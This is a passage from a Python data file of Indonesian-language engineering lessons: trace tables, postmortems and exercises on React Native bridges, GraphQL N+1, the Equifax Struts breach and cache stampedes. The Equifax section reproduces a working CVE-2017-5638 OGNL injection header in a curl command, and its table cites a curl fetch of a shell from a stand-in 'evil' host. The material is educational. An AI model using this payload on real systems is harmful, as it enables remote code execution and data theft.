# -*- coding: utf-8 -*-
"""
Authentic Remediation Data for Tier 09 Part 2 (Topics 148-156):
Cross-Platform Mobile/Desktop, Backend APIs (gRPC/GraphQL), Backend Security (OAuth/JWT),
Caching Strategies, Async Messaging (Kafka/RabbitMQ), Distributed Systems Resilience,
DevOps/CI-CD, Kubernetes Orchestration, Observability & SRE.
"""

DATA_TIER_09_PART2 = {
    148: {
        "trace": r"""#### Tabel Penelusuran Kemacetan Serialisasi Bridge Antara JavaScript & Native (React Native 60 FPS Drop)
| Frame Waktu Animasi ($16.6\text{ ms}$) | Aksi Pengguna (Gesture Layar) | Thread JavaScript UI | Serialisasi Pesan Bridge JSON | Thread Native (iOS UIKit / Android View) | Pengalaman Visual Pengguna |
|---|---|---|---|---|---|
| Frame 1 ($t=0\text{ ms}$) | Jari mulai menggeser layar | Deteksi event sentuhan | Ubah posisi ke JSON string | Penguraian JSON string di native | Animasi mulai bergerak |
| Frame 2 ($t=16\text{ ms}$) | Geser cepat (Fling gesture) | Hitung fisika momentum | Serialisasi 100 objek koordinat | Thread native menunggu antrean bridge | Terjadi penundaan 5 ms |
| Frame 3 ($t=32\text{ ms}$) | Beban jenuh bertumpuk | JavaScript terbebani kalkulasi | Antrean pesan JSON membengkak di bridge | **BRIDGE TERSUMBAT (SERIALIZATION BOTTLENECK)!** | Thread native kehilangan batas frame! |
| Frame 4 ($t=48\text{ ms}$) | Jari bergerak ke titik baru | Event tertahan di antrean | Keterlambatan pesan $> 60\text{ ms}$ | Frame drop terjadi berturutan | **GERAKAN LAYAR PATAH-PATAH (STUTTER / JANK)!**|
| Mitigasi JSI Modern | Direct Native Memory Access | JavaScript Interface (JSI) | **NOL SERIALISASI JSON! (C++ Shared Pointers)** | Native membaca memori C++ secara langsung | 60 FPS mulus sempurna (Bebas Lag) |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Kemacetan Serialisasi Antarmuka Bridge React Native yang Melumpuhkan Aplikasi Transportasi Online Global",
            "chronology": r"""- **Kronologi & Konteks Kasus**: Sebuah aplikasi pemesanan transportasi online berskala puluhan juta pengguna aktif menulis ulang aplikasi mobile mereka menggunakan arsitektur cross-platform React Native generasi awal untuk menyatukan basis kode iOS dan Android.
- **Akar Masalah Rekayasa Lintas Platform & Arsitektur Serialisasi Bridge**: Pada arsitektur React Native klasik, logika bisnis JavaScript dan komponen tampilan native (iOS UIKit dan Android View) berjalan di dua utas terpisah dan berkomunikasi secara asinkron melalui sebuah jembatan penyeberangan (*The Bridge*). Seluruh data event gestur sentuhan pengguna, pembaruan posisi peta GPS berfrekuensi tinggi, dan koordinat animasi harus diubah menjadi string teks JSON (*JSON Stringification*), disalin melintasi batas memori bridge, dan diurai kembali (*JSON Parsing*) di sisi native. Saat peta menampilkan puluhan armada taksi bergerak bersamaan dengan gestur cubit zoom layar (*pinch-to-zoom*), volume pesan di antrean bridge melonjak hingga ribuan pesan per detik. Jembatan bridge mengalami kemacetan parah (*Bridge Congestion*), menyebabkan frame rate animasi anjlok drastis dari 60 FPS menjadi 12 FPS, respons sentuhan layar tertunda hingga 1 detik, dan memicu banjir ulasan bintang satu di toko aplikasi.""",
            "snippet": r"""```javascript
// Rekonstruksi Masalah Serialisasi Berulang pada Jembatan Bridge Mobile
// Utas JavaScript: Mengirim koordinat pergerakan peta 60 kali per detik
function handleMapPanGestureFlawed(gestureCoordinates) {
    // CACAT ARSITEKTUR BRIDGE KLASIK:
    // Setiap pembaruan koordinat dibungkus dalam string JSON dan disalin melintasi bridge:
    // JSON.stringify({ type: "UPDATE_MAP_CAMERA", x: coord.x, y: coord.y, timestamp: Date.now() })
    // Pada frekuensi tinggi, antrean bridge tersumbat total dan memicu frame drop parah!
    NativeModules.MapManager.updateCameraPosition(gestureCoordinates);
}

// Mitigasi Defensif Modern: JavaScript Interface (JSI) & Fabric Renderer
// Menggunakan referensi memori bersama C++ HostObject langsung tanpa konversi JSON!
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Krisis performa bridge mendorong perombakan fundamental arsitektur aplikasi mobile lintas platform di seluruh industri: (1) Meta merancang ulang arsitektur React Native dengan menghapus jembatan bridge secara total (*New Architecture*), menggantikannya dengan *JavaScript Interface* (JSI) yang mengizinkan JavaScript memegang referensi langsung ke objek C++ native secara sinkron tanpa serialisasi JSON; (2) Lonjakan popularitas *Flutter* yang merender antarmuka langsung ke kanvas grafis Skia/Impeller di tingkat kode mesin tanpa lapisan perantara native view."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun modul pertukaran pesan lintas platform (*Cross-Language Message Serializer*) mandiri dalam C/Python yang mengemas struktur data kompleks (ID Pengguna, Koordinat GPS Float64, Status Boolean) ke dalam format biner kompak berukuran tetap (*Packed Binary Buffer*) menggunakan penataan memory alignment yang tepat, mengeliminasi overhead serialisasi string JSON hingga 80%.
- **Petunjuk Perancangan Arsitektur**:
  - Gunakan struct packing: `struct.pack('!Idd?', user_id, lat, lon, is_active)`.
  - Bandingkan ukuran byte buffer biner (21 byte) vs representasi JSON teks (sekitar 90 byte).
- **Test Vector & Kasus Uji Ekstrem**:
  - *Integritas Ekstraksi*: Serialisasikan $100.000$ koordinat acak; buktikan proses de-serialisasi mengembalikan nilai float dengan presisi mutlak tanpa galat pembulatan teks.
- **Rubrik Penilaian Mandiri**: 40% Pengemasan Format Biner Kompak yang Tepat, 30% Eliminasi Overhead Memori dan Waktu Parsing, 30% Kerapian Enkapsulasi Kode.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan simulasi antarmuka memori bersama (*Direct Shared Memory Bridge*) antara interpreter bahasa skrip dan modul grafis native dalam C/Python menggunakan pointer memori bersama (*Shared Buffer Pointer* via ctypes atau memoryview), membuktikan bahwa pembaruan array $10.000$ titik koordinat layar dapat dibaca oleh modul native dalam waktu konstan $\mathcal{O}(1)$ tanpa biaya penyalinan memori (*Zero-Copy*).
- **Petunjuk Perancangan Arsitektur**:
  - Alokasikan array kontinu di memori C.
  - Berikan pointer dasar memori langsung ke script runner untuk dimutasi in-place.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Benchmark Zero-Copy*: Bandingkan waktu transfer data 10.000 titik koordinat antara serialisasi JSON string (memakan waktu beberapa milidetik) vs akses memori pointer langsung ($< 5\text{ mikrodetik}$).
- **Rubrik Penilaian Mandiri**: 40% Penerapan Akses Memori Zero-Copy yang Tepat, 30% Eliminasi Total Serialisasi JSON String, 30% Pengukuran Benchmark Latensi Akurat.

### Tingkat 3: Mahir
- **Tugas**: Rancang arsitektur aplikasi desktop lintas platform ultra-ringan menggunakan model *Native WebView + Rust Backend* (konsep mirip arsitektur Tauri) di mana antarmuka HTML/CSS berjalan di dalam mesin peramban native sistem operasi (WebKit/WebView2) dan berkomunikasi dengan backend sistem via pemanggilan fungsi asinkron biner IPC lokal berkemampuan isolasi hak akses (*Capability-Based IPC Isolation*).
- **Petunjuk Perancangan Arsitektur**:
  - Backend memvalidasi setiap pemanggilan perintah (*IPC Command Dispatcher*) terhadap daftar izin whitelist ketat sebelum mengeksekusi operasi sistem berkas.
  - Ukuran biner eksekutabel akhir harus terbukti sangat ringkas ($< 15\text{ MB}$, dibandingkan aplikasi berbasis Electron yang berukuran $> 150\text{ MB}$).
- **Test Vector & Kasus Uji Ekstrem**:
  - *Audit Keamanan IPC*: UI mencoba memanggil perintah tidak terdaftar `system_execute_shell`; backend harus menolak seketika dengan error `PermissionDenied` dan mencatat upaya pelanggaran sandbox.
- **Rubrik Penilaian Mandiri**: 40% Arsitektur Ringan Native WebView Berbasis IPC Terisolasi, 30% Penegakan Keamanan Capability Whitelist yang Kuat, 30% Efisiensi Ukuran Biner dan Konsumsi RAM."""
    },

    149: {
        "trace": r"""#### Tabel Penelusuran Masalah Bom Kueri GraphQL N+1 & Kehabisan Pool Koneksi Basis Data
| Langkah Eksekusi Resolver GraphQL | Kueri Masukan Klien | Resolver yang Terpicu | Perintah SQL yang Dieksekusi ke Database | Jumlah Kueri SQL Kumulatif | Status Connection Pool DB (Maks: 50) |
|---|---|---|---|---|---|
| Kueri Utama | `query { authors { books { title } } }`| Resolver `authors` | `SELECT * FROM authors LIMIT 100;` | 1 Kueri SQL Utama | 1 Koneksi terpakai |
| Eksekusi Bersarang 1 | Untuk Author 1 | Resolver `books(author_id=1)` | `SELECT * FROM books WHERE author_id = 1;` | 2 Kueri SQL | 2 Koneksi terpakai |
| Eksekusi Bersarang 2..100 | Untuk Author 2..100 | Resolver `books` dieksekusi independen | **100 KUERI SQL TAMBAHAN DIEKSEKUSI INDIVIDUAL!**| **101 Kueri SQL Total (N+1 Problem)!**| Antrean kueri membanjiri pool |
| Lonjakan Beban | 10 Permintaan Bersamaan | 10 kueri GraphQL masuk serentak | $10 \times 101 = 1.010$ kueri SQL dalam 1 detik! | 1.010 Kueri menumpuk | **CONNECTION POOL EXHAUSTION!** |
| Keruntuhan Sistem | Kueri baru tertahan | Database server CPU 100% | Waktu tunggu melebihi timeout batas ($>30\text{ s}$) | Error: `Connection pool timed out` | Layanan backend crash dan menolak seluruh user |
| Mitigasi DataLoader | Batching & Caching | Agregasi seluruh ID Author | `SELECT * FROM books WHERE author_id IN (1, 2, ..., 100);` | **Tepat 2 Kueri SQL Saja!** | 2 Koneksi terpakai stabil (Aman) |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Kelumpuhan Kluster Basis Data Produksi Akibat Bom Kueri GraphQL N+1 pada Layanan Media Sosial",
            "chronology": r"""- **Kronologi & Konteks Kasus**: Pada platform media sosial yang memproses jutaan pengguna aktif, tim pengembang mengganti antarmuka REST API lama dengan GraphQL untuk memberikan fleksibilitas kepada tim front-end dalam meminta struktur data yang dinamis.
- **Akar Masalah Arsitektur API Modern, Resolver GraphQL, & Masalah Kueri N+1**: Desain resolver GraphQL mengevaluasi setiap bidang (*field*) secara independen dan naif. Sebuah komponen antarmuka pengguna meminta daftar 100 postingan teratas beserta data profil pengarang dan komentar-komentarnya. Resolver mengeksekusi 1 kueri SQL untuk mengambil 100 postingan, lalu untuk setiap postingan, resolver mengeksekusi 1 kueri SQL terpisah untuk mengambil data pengarang, dan 1 kueri SQL terpisah lagi untuk mengambil komentarnya. Satu permintaan GraphQL tunggal memicu lebih dari 201 kueri SQL ke basis data (*The N+1 Query Problem*). Ketika kampanye pemasaran diluncurkan dan ribuan pengguna membuka aplikasi secara serempak, jutaan kueri SQL membanjiri basis data dalam hitungan detik. Kolam koneksi basis data (*Database Connection Pool*) jenuh seketika, latensi kueri melonjak dari 5 milidetik menjadi lebih dari 30 detik, dan server basis data utama mengalami *crash* akibat kehabisan memori.""",
            "snippet": r"""```javascript
// Rekonstruksi Masalah Bom Kueri N+1 pada Resolver GraphQL Naif
const resolversFlawed = {
    Query: {
        authors: async () => {
            // Kueri 1: Mengambil 100 penulis
            return await db.query("SELECT * FROM authors LIMIT 100");
        }
    },
    Author: {
        books: async (parentAuthor) => {
            // CACAT FATAL N+1: Fungsi ini dieksekusi 100 KALI secara individual!
            // Menghasilkan 100 kueri SQL terpisah yang mematikan pool koneksi database:
            return await db.query("SELECT * FROM books WHERE author_id = ?", [parentAuthor.id]);
        }
    }
};

// Mitigasi Defensif Modern: Pemanfaatan DataLoader untuk Batching & Caching
const DataLoader = require('dataloader');

// Menggabungkan 100 permintaan individual menjadi 1 kueri SQL tunggal berbasis klausa 'IN (...)':
const bookLoader = new DataLoader(async (authorIds) => {
    const books = await db.query("SELECT * FROM books WHERE author_id IN (?)", [authorIds]);
    return authorIds.map(id => books.filter(b => b.author_id === id));
});

const resolversSafe = {
    Author: {
        books: (parentAuthor) => bookLoader.load(parentAuthor.id) // Terbatching otomatis!
    }
};
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Krisis kueri GraphQL membuktikan bahwa fleksibilitas antarmuka API lapisan aplikasi harus selalu diimbangi dengan kontrol perlindungan sumber daya di backend. Praktik terbaik arsitektur GraphQL modern mewajibkan: (1) Penerapan pustaka *DataLoader* (atau pembungkus batching) secara wajib pada setiap hubungan entitas data bersarang untuk mengubah kompleksitas $N+1$ menjadi 2 kueri SQL; (2) Penerapan batas kedalaman kueri maksimum (*Query Depth Limiting*) dan analisis biaya kueri statis (*Query Cost Analysis*) yang secara otomatis menolak permintaan kueri yang terlalu dalam atau terlalu rakus sumber daya sebelum dieksekusi."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun server RESTful API minimalis berstandar RFC 7231 dalam Python (FastAPI/Flask) atau Go yang menerapkan pola operasi CRUD untuk sumber daya `/api/v1/articles` dengan penanganan kode status HTTP yang semantik (`200 OK`, `201 Created`, `400 Bad Request`, `404 Not Found`, `422 Unprocessable Entity`) dan validasi skema masukan JSON.
- **Petunjuk Perancangan Arsitektur**:
  - Gunakan model validasi data kuat (seperti Pydantic dalam Python atau Struct Validation dalam Go).
  - Pastikan operasi `GET`, `PUT`, `DELETE` bersifat idempoten (*Idempotent*).
- **Test Vector & Kasus Uji Ekstrem**:
  - *Validasi Skema*: Kirim permintaan `POST` dengan tipe data umur berupa string huruf; server harus menolak dengan kode status `422 Unprocessable Entity` dan pesan kesalahan field yang spesifik.
- **Rubrik Penilaian Mandiri**: 40% Kepatuhan Semantik Standar RESTful HTTP, 30% Validasi Skema Input yang Kuat, 30% Kerapian Enkapsulasi Kode.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan implementasi pola *DataLoader* mandiri dalam Python/JavaScript yang mengumpulkan pemanggilan kunci individual yang terjadi dalam satu siklus microtask event loop yang sama (*Event Loop Tick Coalescing*), lalu mengeksekusi fungsi batch tunggal untuk mengambil seluruh data sekaligus, lengkap dengan mekanisme tembolok in-memory per-permintaan (*Per-Request Caching*).
- **Petunjuk Perancangan Arsitektur**:
  - Jadwalkan pemanggilan fungsi batch menggunakan `queueMicrotask` atau `Promise.resolve().then()`.
  - Kembalikan objek Promise independen untuk setiap kunci yang dipanggil.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Verifikasi Batching*: Panggil `loader.load(1)`, `loader.load(2)`, `loader.load(3)` secara bersamaan; buktikan fungsi batch database hanya dipanggil tepat 1 kali dengan argumen array `[1, 2, 3]`.
- **Rubrik Penilaian Mandiri**: 40% Penggabungan Kunci Berbasis Event Loop Tick yang Tepat, 30% Eliminasi Masalah N+1 Kueri Terbukti, 30% Manajemen Cache Per-Request Rapi.

### Tingkat 3: Mahir
- **Tugas**: Rancang layanan komunikasi mikroservis berkinerja tinggi menggunakan *gRPC* dan *Protocol Buffers* (Protobuf v3) dalam Go/Python yang mendukung *Bidirectional Streaming RPC* dengan penegakan batas waktu tenggat (*Deadline Propagation*) dan kompresi biner HTTP/2, mampu memproses $50.000$ pesan per detik dengan latensi P99 $< 5\text{ ms}$.
- **Petunjuk Perancangan Arsitektur**:
  - Definisikan file `.proto` yang memuat layanan streaming data telemetri.
  - Tangani pembatalan konteks (`context.Canceled` / `DEADLINE_EXCEEDED`) di mana proses backend secara otomatis menghentikan kueri berat jika klien memutuskan koneksi di tengah jalan.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Perambatan Deadline*: Klien menyetel timeout 50 ms pada pemanggilan streaming; buat server menunda pemrosesan selama 100 ms; pastikan gRPC membatalkan eksekusi di server dan melempar status `DEADLINE_EXCEEDED` seketika.
- **Rubrik Penilaian Mandiri**: 40% Kepatuhan Spesifikasi Protokol gRPC & Protobuf v3, 30% Penerapan Propagasi Deadline & Pembatalan Konteks yang Benar, 30% Throughput Streaming Tingkat Tinggi."""
    },

    150: {
        "trace": r"""#### Tabel Penelusuran Kerentanan Apache Struts OGNL Remote Code Execution (Equifax Breach CVE-2017-5638)
| Tahap Pemrosesan HTTP Header | Nilai Header `Content-Type` yang Diterima | Parser Sub-sistem Jakarta Multipart | Status Evaluasi Ekspresi OGNL | Hak Akses Eksekusi Biner Server | Konsekuensi Keamanan Sistem |
|---|---|---|---|---|---|
| Header Masukan | `Content-Type: %{(#_='multipart/form-data')...}` | Memeriksa string header masukan | Karakter `%{#` terdeteksi | Berjalan di bawah akun `tomcat` | Permintaan HTTP jahat masuk |
| Parsing Gagal | Format content-type tidak valid | Parser melempar pesan kesalahan exception | Exception handler membuat pesan error | Pesan error menyertakan raw string input | Menyiapkan teks respons error |
| Evaluasi OGNL | Exception handler memanggil OGNL | Menguraikan string error via `TextParseUtil` | **MENGEKSEKUSI OGNL PAYLOAD DI DALAM HEADER!**| OGNL mengakses `java.lang.ProcessBuilder` | **REMOTE CODE EXECUTION (RCE) AKTIF!**|
| Eksekusi Shellcode | Payload menjalankan perintah shell | `ProcessBuilder("curl", "http://evil/shell")` | Meluncurkan shellcode Linux | Penyerang mengendalikan server penuh | Pintu belakang berhasil ditanam |
| Eksfiltrasi Data | Pencurian data dari basis data internal | Mengakses basis data riwayat kredit | Ekstraksi 147 juta data warga negara | Nol enkripsi data at rest | **SKANDAL KEBOCORAN TERBESAR SEJARAH!**|""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Pembobolan Data Massal 147 Juta Warga Negara Equifax Akibat Celah Apache Struts OGNL (CVE-2017-5638)",
            "chronology": r"""- **Kronologi & Konteks Sejarah**: Antara Mei dan Juli 2017, biro pemeringkat kredit keuangan raksasa Amerika Serikat, Equifax, diretas oleh penyerang siber. Informasi pribadi sensitif milik lebih dari 147 juta warga negara Amerika (termasuk nama lengkap, nomor Jaminan Sosial / SSN, tanggal lahir, alamat rumah, dan nomor kartu kredit) dicuri, memicu pengunduran diri CEO, penyelidikan kongres AS, dan denda penyelesaian senilai lebih dari 700 juta dolar.
- **Akar Masalah Keamanan Backend & Injeksi Ekspresi OGNL**: Celah keamanan berada pada framework backend Apache Struts 2 yang digunakan pada portal sengketa online Equifax. Ketika sebuah permintaan HTTP dengan header `Content-Type` yang tidak valid diterima, parser `JakartaMultiPartRequest` melempar pesan error yang secara keliru diteruskan ke mesin evaluasi ekspresi *Object-Graph Navigation Language* (OGNL). Penyerang menyisipkan ekspresi OGNL khusus yang diawali dengan karakter `#` di dalam header `Content-Type`. Mesin OGNL mengevaluasi string tersebut sebagai kode Java yang dapat dieksekusi, mengizinkan penyerang memanggil kelas Java internal (`java.lang.ProcessBuilder`) untuk mengeksekusi sembarang perintah biner sistem operasi di server. Meskipun patch resmi telah dirilis oleh Apache pada Maret 2017, tim operasi Equifax gagal memperbarui sistem mereka selama berbulan-bulan akibat ketiadaan inventaris aset perangkat lunak yang terkelola.""",
            "snippet": r"""```bash
# Rekonstruksi Header Eksploitasi RCE Apache Struts (CVE-2017-5638)
# Penyerang menyuntikkan payload eksekusi kode OGNL langsung ke dalam header Content-Type:
curl -X POST "http://vulnerable-equifax-server/dispute.action" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

# Dampak: Perintah 'whoami' dieksekusi di server dan mengembalikan hak akses sistemik ke penyerang!
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Skandal Equifax mengubah drastis disiplin manajemen kerentanan dan keamanan rantai pasok perangkat lunak (*Software Supply Chain Security*). Industri modern mewajibkan: (1) Penerapan *Software Bill of Materials* (SBOM) terotomatisasi yang melacak setiap pustaka open-source pihak ketiga di basis kode; (2) Pemindaian kerentanan CVE berkelanjutan dalam pipeline CI/CD (seperti Snyk, Trivy, Dependabot); (3) Penerapan prinsip *Least Privilege* dan isolasi container tanpa izin tulis (*Read-Only Root Filesystem*) yang membatasi kerusakan jika celah RCE terjadi."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun fungsi hashing password satu arah (*One-Way Password Hasher*) mandiri dalam Python menggunakan algoritma modern standar emas *Argon2id* (atau bcrypt) yang menegakkan parameter keamanan adaptif: biaya memori ($64\text{ MiB}$), biaya iterasi waktu ($3$ passes), dan paralelisme ($4$ threads) dengan pembangkitan garam kriptografis acak (*Salt*) 16-byte unik per-password.
- **Petunjuk Perancangan Arsitektur**:
  - Gunakan pustaka resmi `argon2-cffi` atau modul kriptografi yang tervalidasi.
  - Sediakan fungsi `hash_password(raw_password)` dan `verify_password(raw_password, hashed_str)`.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Verifikasi Hash*: Hash password `"Rahasia123!"`; verifikasi password yang sama menghasilkan hash string berbeda setiap kali dipanggil (karena garam unik), namun `verify_password` selalu mengembalikan `true`.
- **Rubrik Penilaian Mandiri**: 40% Penerapan Algoritma Argon2id Sesuai Rekomendasi OWASP, 30% Verifikasi Keunikan Salt Kriptografis, 30% Kekebalan Terhadap Serangan Timing (Constant-Time Compare).

### Tingkat 2: Menengah
- **Tugas**: Kembangkan layanan otentikasi berbasis *JSON Web Token* (JWT) dalam Python/Node.js yang menandatangani token menggunakan algoritma asimetris RSA/ECDSA (RS256/ES256 dengan kunci privat), memverifikasi tanda tangan menggunakan kunci publik, menegakkan klaim waktu kedaluwarsa (`exp`), dan menolak secara tegas serangan *Algorithm Confusion Attack* (pemaksaan algoritma `none` atau manipulasi kunci simetris HS256).
- **Petunjuk Perancangan Arsitektur**:
  - Pisahkan tiga segmen JWT: `Header`, `Payload`, `Signature` yang di-encode Base64URL.
  - Validasi bahwa algoritma pada header token cocok persis dengan algoritma yang diizinkan oleh server (*Strict Algorithm Whitelisting*).
- **Test Vector & Kasus Uji Ekstrem**:
  - *Serangan Algoritma "none"*: Kirimkan JWT palsu dengan header `{"alg": "none"}`; verifikasi server menolak token dengan error `SecurityException: Algoritma none dilarang`.
- **Rubrik Penilaian Mandiri**: 40% Penandatanganan Kriptografi Asimetris RS256 yang Benar, 30% Kekebalan Mutlak Terhadap Serangan Algorithm Confusion, 30% Penegakan Klaim Kadaluarsa exp.

### Tingkat 3: Mahir
- **Tugas**: Rancang server otorisasi protokol *OAuth 2.0* lengkap dengan alur *Proof Key for Code Exchange* (PKCE / RFC 7636) dalam Python/Node.js untuk melindungi otorisasi aplikasi klien publik dari serangan intersepsi kode otorisasi (*Authorization Code Interception Attack*).
- **Petunjuk Perancangan Arsitektur**:
  - Klien membangkitkan `code_verifier` acak (kriptografis 128 karakter) dan menghitung `code_challenge = BASE64URL(SHA256(code_verifier))`.
  - Server memvalidasi transformasi hash `code_verifier` saat penukaran token access sebelum menerbitkan JWT.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Penukaran Kode Otorisasi*: Tukar `authorization_code` dengan `code_verifier` yang salah; server harus menolak dengan kode galat `invalid_grant` dan membatalkan seluruh sesi otentikasi.
- **Rubrik Penilaian Mandiri**: 40% Kepatuhan Alur Protokol OAuth 2.0 PKCE RFC 7636, 30% Verifikasi Transformasi Kriptografis SHA-256 yang Tepat, 30% Keamanan Penerbitan Token Terisolasi."""
    },

    151: {
        "trace": r"""#### Tabel Penelusuran Bencana Cache Stampede (Thundering Herd) & Mitigasi XFetch
| Titik Waktu Kejadian | State Kunci Cache Redis (Kunci Populer) | Permintaan Pengguna Masuk ($RPS$) | Status Evaluasi Algoritma XFetch | Aksi Backend Server terhadap Basis Data | Beban Basis Data Utama (CPU & I/O) |
|---|---|---|---|---|---|
| Operasi Normal | Tersimpan di Cache Redis (TTL: 60 s) | 50.000 Request / detik | Cache Hit: Baca dari RAM instan | 0 Kueri ke DB (Semua dilayani Redis) | 2% CPU (Sangat Sehat) |
| Detik ke-60 (Kedaluwarsa)| **KUNCI KEDALUWARSA DI REDIS!** | 50.000 Request / detik | **CACHE MISS MASSAL!** | Seluruh 50.000 request menerobos ke DB! | **CPU LONJAK 100%! I/O SATURASI!** |
| Keruntuhan Berantai | Kueri DB melambat dari 5ms ke 5s | Request baru terus berdatangan | Antrean kueri menumpuk 200.000 | Server kehabisan koneksi database | **DATABASE CRASH (TOTAL DOWNTIME)!**|
| Mitigasi XFetch Probabilistik| Kunci mendekati habis ($t < TTL$) | 50.000 Request / detik | Evaluasi: $-\beta \cdot \delta \ln(rand) > TTL - t$ | **Tepat 1 Worker Menghitung Ulang di Awal!** | 1 Kueri DB saja di latar belakang |
| Transisi Mulus | Nilai baru ditulis sebelum habis | - | Kunci diperbarui tanpa pernah kosong | 0 Request pengguna yang terhambat | 2% CPU stabil (Nol Downtime) |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Keruntuhan Kluster Basis Data Utama Akibat Bencana Cache Stampede (Thundering Herd) Saat Kampanye Diskon Global",
            "chronology": r"""- **Kronologi & Konteks Kasus**: Pada peluncuran festival belanja diskon kilat tengah malam di platform e-commerce besar, jutaan pengguna mengakses halaman produk unggulan (*flash sale product*) yang memuat data harga dan stok secara bersamaan.
- **Akar Masalah Strategi Caching & Kedaluwarsa Bersamaan (Cache Stampede)**: Data halaman produk tersebut disimpan di dalam kluster cache in-memory Redis dengan waktu kedaluwarsa (*Time-To-Live / TTL*) statis 60 detik. Selama 59 detik pertama, seluruh 80.000 permintaan per detik dilayani secara instan oleh Redis dari memori RAM. Tepat pada detik ke-60, kunci produk tersebut kedaluwarsa dan terhapus dari Redis. Pada milidetik berikutnya, puluhan ribu permintaan yang masuk mengalami *Cache Miss* secara serempak. Seluruh thread server aplikasi secara serentak mengeksekusi kueri SQL berat ke basis data relasional utama untuk menghitung ulang data produk yang hilang (*Cache Stampede / Thundering Herd*). Server basis data dihantam puluhan ribu kueri dalam satu milidetik, menghabiskan seluruh memori buffer pool dan CPU, memicu penguncian tabel, dan mematikan seluruh situs e-commerce selama lebih dari 90 menit.""",
            "snippet": r"""```python
# Rekonstruksi Anti-Pattern Cache Naif vs Mitigasi XFetch Probabilistic Early Expiration
import time
import math
import random

# CACAT: Pola Caching Naif yang memicu Cache Stampede saat TTL habis
def get_product_data_flawed(product_id):
    data = redis_client.get(product_id)
    if data is None:
        # BENCANA: Jika 50.000 request tiba saat data None,
        # seluruh 50.000 request akan mengeksekusi baris kueri lambat ini secara serempak!
        data = execute_expensive_db_query(product_id)
        redis_client.set(product_id, data, ex=60)
    return data

# MITIGASI STANDAR EMAS: Algoritma XFetch (Optimal Probabilistic Early Expiration)
# Berdasarkan paper riset ACM VLD 2015 (Optimal Probabilistic Cache Stampede Prevention)
def get_product_data_xfetch_safe(product_id, beta=1.0):
    entry = redis_client.get_with_metadata(product_id)
    if entry is None:
        return recompute_and_cache(product_id)

    data, ttl_remaining, compute_time_delta = entry
    # Formula XFetch: Evaluasi probabilitas apakah harus menghitung ulang sekarang
    # sebelum kunci benar-benar mati di cache:
    if - compute_time_delta * beta * math.log(random.random()) > ttl_remaining:
        # Tepat satu thread pekerja acak akan memperbarui cache di latar belakang!
        trigger_background_recompute(product_id)

    return data
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Krisis Cache Stampede melahirkan evolusi dalam arsitektur caching enterprise multi-tier. Pola pembaruan cache modern melarang keras penggunaan TTL statis tanpa perlindungan. Rekayasa modern menerapkan: (1) Algoritma *XFetch* probabilitas kedaluwarsa dini optimal; (2) Pemasangan kunci terdistribusi (*Distributed Mutex / Lock*) menggunakan Redis `SETNX` sehingga hanya tepat satu server yang diizinkan menghitung ulang data ke basis data saat cache miss terjadi, sementara permintaan lain menunggu atau membaca data usang (*stale-while-revalidate*); (3) Penambahan nilai acak *Jitter* pada TTL (misal $TTL = 60 \pm 10\text{ s}$) untuk mencegah ribuan kunci kedaluwarsa pada detik yang sama persis."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun implementasi struktur data tembolok in-memory *Least Recently Used* (LRU Cache) mandiri dalam Python/C++ dengan kapasitas tetap $K$ yang mendukung operasi `get(key)` dalam waktu $\mathcal{O}(1)$ dan `put(key, value)` dalam waktu $\mathcal{O}(1)$ menggunakan kombinasi Hash Map dan Doubly Linked List.
- **Petunjuk Perancangan Arsitektur**:
  - Hash Map memetakan kunci ke simpul Doubly Linked List.
  - Setiap kali simpul diakses (`get` atau `put`), pindahkan simpul ke kepala list (*Most Recently Used*).
  - Jika kapasitas penuh saat `put`, buang simpul di ekor list (*Least Recently Used*).
- **Test Vector & Kasus Uji Ekstrem**:
  - *Siklus LRU*: Kapasitas $K = 2$. Sisipkan `(1, 1)`, `(2, 2)`; akses kunci `1`; sisipkan `(3, 3)`; buktikan kunci `2` terbuang dari cache dan kunci `1` serta `3` tetap ada.
- **Rubrik Penilaian Mandiri**: 40% Kompleksitas O(1) Operasi Get dan Put Terverifikasi, 30% Logika Pemindahan dan Pengusiran Node LRU yang Tepat, 30% Kerapian Enkapsulasi Kode.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan simulator penyeimbang beban tembolok terdistribusi menggunakan algoritma *Consistent Hashing* (Hash Ring dengan Virtual Nodes / Vnodes) dalam Python/Go yang memetakan kunci ke $N$ server cache, buktikan bahwa penambahan atau penghapusan 1 server cache hanya memindahkan rata-rata $K / N$ kunci data tanpa mengacaukan pemetaan kunci lainnya.
- **Petunjuk Perancangan Arsitektur**:
